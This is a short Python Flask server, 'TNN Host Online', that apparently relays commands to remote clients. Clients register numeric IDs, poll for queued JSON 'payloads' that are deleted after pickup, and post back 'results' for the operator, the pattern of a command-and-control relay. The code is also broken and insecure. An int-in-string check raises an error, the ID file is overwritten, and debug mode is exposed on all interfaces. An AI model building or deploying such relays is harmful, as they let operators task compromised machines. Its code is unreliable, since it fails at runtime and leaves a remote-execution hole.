from flask import Flask, jsonify, request
import json
import os
app = Flask('app')
@app.route('/')
def main():
    return """
    TNN Host Online
    """
@app.route('/payload/<int:id>', methods=['GET'])
def get_payload(id):
    bool = False
    with open("ip.txt","r") as f:
        IDs = f.read()
        for ID in IDs:
            if id in ID:
                bool = True
    if not bool:
        with open("ip.txt","w") as f:
            f.write(f"{id}\n")
    try:
        with open(f"payload{id}.txt","r") as f:
            json_str = f.read()
            payload = json.loads(json_str)
        os.remove(f"payload{id}.txt")
        print("\033[92mPayload found")
        return jsonify(payload)
    except:
        print("\033[93mNo payload found")
        return jsonify({'result': 'No payload found'})
@app.route('/payload/<int:id>', methods=['POST'])
def create_payload(id):
    payload = request.get_json()
    with open(f"payload{id}.txt","w") as f:
        f.write(json.dumps(payload))
    print("\033[92mPayload created successfully")
    return jsonify({'result': 'Payload created successfully'})
    
@app.route('/close/<int:id>', methods=['GET'])
def close(id):
    with open("ip.txt", "r") as f:
        file_contents = f.read()
    if str(id) in file_contents:
        file_contents = file_contents.replace(f"{id}\n", "")
        with open("ip.txt", "w") as f:
            f.write(file_contents)
        return jsonify({'result':"Success"})
    else:
        return jsonify({'result':"Error"})
@app.route('/result/<int:id>', methods=['GET'])
def get_result(id):
    try:
        with open(f"result{id}.txt","r") as f:
            json_str = f.read()
            payload = json.loads(json_str)
        print(payload)
        print("\033[92mResult found")
        os.remove(f"result{id}.txt")
        return jsonify({'result':payload}), 200
    except:
        print("\033[93mNo result found")
        return jsonify({'error': 'No payload found'}), 300
@app.route('/result/<int:id>', methods=['POST'])
def create_result(id):
    payload = request.get_json()
    with open(f"result{id}.txt","w") as f:
        f.write(json.dumps(payload))
    print("\033[92mResult created")
    return jsonify({'result': 'Payload created successfully'})
@app.route('/ip/<int:ip>', methods=['POST'])
def add_ip(ip):
    with open("ip.txt","a") as f:
        f.write(f"{ip}\n")
    print("\033[92mIP added")
    return jsonify({'result': 'IP address added successfully'})
@app.route('/ip/get', methods=['GET'])
def get_ip():
    ip_list = []
    with open("ip.txt","r") as f:
        for line in f:
            ip_list.append(line)
    print("\033[92mClient online")
    return jsonify({'result': ip_list})

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0')
